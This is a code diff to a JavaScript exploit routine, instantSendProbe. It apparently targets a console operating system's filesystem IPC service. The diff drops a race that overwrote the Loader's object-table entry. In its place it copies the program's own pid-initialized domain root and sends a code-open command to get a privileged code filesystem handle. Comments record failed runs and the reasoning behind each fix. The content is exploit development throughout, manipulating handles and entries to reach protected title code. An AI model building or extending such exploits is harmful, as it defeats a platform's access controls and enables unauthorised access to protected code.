@@ -26,20 +26,21 @@ export async function instantSendProbe(context, title) {
         "instant-send requires the loader-copy state");
 
     const entry20 = context.loaderCopy.ownEntry + 0x20;
-    // Pre-stage everything that costs an IPC: warm the endpoint pointer at
-    // the entry, read both pairs, build the code-open packet.
-    await readFs(context, entry20, 8);
-    const oldPair = await readFs(context, entry20, 0x10);
-    const borrowPair = await readFs(context, target.entry + 0x20, 0x10);
+    // (entry20 kept for reference; the own-entry copy needs no staging)
     const slots = arenaSlots(context);
     const info = arenaAlloc(context, 0x2000, "is-info");
     buildCmif(slots.pkt, {cmd: 0,
         input: [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title))),
         b: [{addr: info + 32n, size: 0x1a4}]});
 
-    // The race: borrow-write (1 IPC), copy (1 IPC), then the transport
-    // battery — every send fires within the pre-kill window (~5-400ms).
-    await writeFs(context, entry20, borrowPair);
+    // The reference copies ITS OWN pid-initialized, promoted root through
+    // its inspection domain (app/domain.cjs openDomain: fresh fsp-srv ->
+    // cmd1+{pid:true} init -> ConvertToDomain; domain-copy then copies the
+    // OWN object). Borrowing the LOADER's object instead binds the copy to
+    // the Loader's process — every pid-touching command (init, code-open)
+    // mismatches the requester and the server kills the session (runs
+    // 48-61). The borrow was the fatal substitute all along: copy our own
+    // entry, no borrow, no restore.
     let copyHandle = 0;
     try {
         const reply = cmifSend(owned.handle, {pkt: slots.pkt,
@@ -50,39 +51,30 @@ export async function instantSendProbe(context, title) {
         const copyRc = reply.transport;
         if (copyRc === 0 && reply.moves && reply.moves.length)
             copyHandle = track(context, reply.moves[0], "is-copy");
-        await khLog("IS1 copy rc=" + hex(copyRc) +
+        await khLog("IS1 copy-own rc=" + hex(copyRc) +
             " handle=" + hex(copyHandle));
         if (copyHandle) {
-            // The reference initializes every root before use: cmd 1 with
-            // u64(0) input AND the send-pid descriptor (fs-root-control.cjs
-            // 'Initialize dedicated PID-test root', {pid: true}). Our earlier
-            // descriptor-less cmd 1 returned an error result (0xA2B39A02) —
-            // malformed, not harmless. The pid descriptor is the init.
-            buildCmif(slots.pkt2, {cmd: 1, input: u64Bytes(0n), pid: true});
-            const init = bareSendTransport(copyHandle, slots.pkt2);
-            let initR = "-";
-            if (init === 0) initR = hex(cmifReply(slots.pkt2).result);
+            // Code-open directly — if our domain root's initialization is
+            // inherited like the reference's, this is the whole story.
             buildCmif(slots.pkt, {cmd: 0,
                 input: [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title))),
                 b: [{addr: info, size: 0x1a4}]});
-            const t2 = init === 0
-                ? bareSendTransport(copyHandle, slots.pkt) : 0xF601;
-            await khLog("IS2 init(cmd1,pid)=" + hex(init) + "/" + initR +
-                " code-open=" + hex(t2));
-            if (t2 === 0) {
-                const parsed = cmifReply(slots.pkt);
-                await khLog("IS3 result=" + hex(parsed.result) +
-                    " moves=" + (parsed.moves ? parsed.moves.length : 0));
-                if (parsed.result === 0 && parsed.moves && parsed.moves.length) {
-                    context.instantCodeFs = track(context, parsed.moves[0],
-                        "is-codefs");
-                    await khLog("IS4 ***CODE FS OPEN*** handle=" +
-                        hex(context.instantCodeFs));
-                }
+            const t2 = bareSendTransport(copyHandle, slots.pkt);
+            let parsed = null;
+            if (t2 === 0) parsed = cmifReply(slots.pkt);
+            await khLog("IS2 code-open=" + hex(t2) +
+                (parsed ? " result=" + hex(parsed.result) +
+                    " moves=" + (parsed.moves ? parsed.moves.length : 0) : ""));
+            if (parsed && parsed.result === 0 && parsed.moves &&
+                    parsed.moves.length) {
+                context.instantCodeFs = track(context, parsed.moves[0],
+                    "is-codefs");
+                await khLog("IS3 ***CODE FS OPEN*** handle=" +
+                    hex(context.instantCodeFs));
             }
         }
     } finally {
-        await writeFs(context, entry20, oldPair);
+        // No borrow was taken — nothing to restore.
     }
     // Retain the copied root when the code-open lived (the reference keeps
     // its copied roots for later code-opens); close only the dead ones.
